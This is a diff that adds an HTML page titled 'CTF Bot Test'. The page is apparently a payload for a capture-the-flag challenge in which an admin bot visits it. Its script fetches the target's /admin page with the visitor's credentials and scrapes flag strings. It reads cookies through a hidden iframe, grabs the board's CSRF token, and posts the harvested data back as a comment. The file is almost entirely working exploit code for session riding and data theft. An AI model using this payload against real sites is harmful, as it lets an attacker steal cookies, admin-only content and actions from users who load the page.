@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTF Bot Test</title>
+</head>
+<body>
+
+<h2>CTF Browser Test</h2>
+<pre id="results">Running tests...</pre>
+
+<script>
+const BASE =
+"https://6adce33093b27cc4a0b35c42-8000.gateway.cityinthe.cloud";
+
+const output = document.getElementById("results");
+
+function findFlags(text) {
+    return text.match(/SKY-[A-Za-z0-9-]+/g) || [];
+}
+
+async function checkAdmin() {
+    try {
+        const response = await fetch(BASE + "/admin", {
+            credentials: "include"
+        });
+
+        const html = await response.text();
+
+        return {
+            status: response.status,
+            flags: findFlags(html)
+        };
+    } catch (error) {
+        return {error: String(error)};
+    }
+}
+
+async function checkCallback() {
+    return new Promise(resolve => {
+        const frame = document.createElement("iframe");
+
+        frame.style.display = "none";
+
+        const timer = setTimeout(() => {
+            frame.remove();
+            resolve("Timeout");
+        }, 5000);
+
+        frame.onload = () => {
+            clearTimeout(timer);
+
+            try {
+                const cookies =
+                    frame.contentWindow.document.cookie;
+
+                resolve({
+                    flags: findFlags(cookies),
+                    cookiePresent: Boolean(cookies)
+                });
+            } catch (error) {
+                resolve(String(error));
+            }
+
+            frame.remove();
+        };
+
+        frame.src = "https://callback/";
+        document.body.appendChild(frame);
+    });
+}
+
+async function saveResults(results) {
+    try {
+        const response = await fetch(BASE + "/board", {
+            credentials: "include"
+        });
+
+        const html = await response.text();
+
+        const doc = new DOMParser().parseFromString(
+            html, "text/html"
+        );
+
+        const csrf = doc.querySelector(
+            'input[name="csrf_token"]'
+        )?.value;
+
+        if (!csrf) {
+            return "CSRF token not found";
+        }
+
+        const body = new URLSearchParams({
+            csrf_token: csrf,
+            comment: "CTF_BOT_RESULT " + JSON.stringify(results)
+        });
+
+        const result = await fetch(BASE + "/board", {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: body
+        });
+
+        return "POST status: " + result.status;
+
+    } catch (error) {
+        return String(error);
+    }
+}
+
+async function run() {
+    const admin = await checkAdmin();
+    const callback = await checkCallback();
+
+    const results = {
+        admin: admin,
+        callback: callback
+    };
+
+    output.textContent = JSON.stringify(results, null, 2);
+
+    const saved = await saveResults(results);
+
+    output.textContent += "\n" + saved;
+}
+
+run();
+</script>
+
+</body>
+</html>
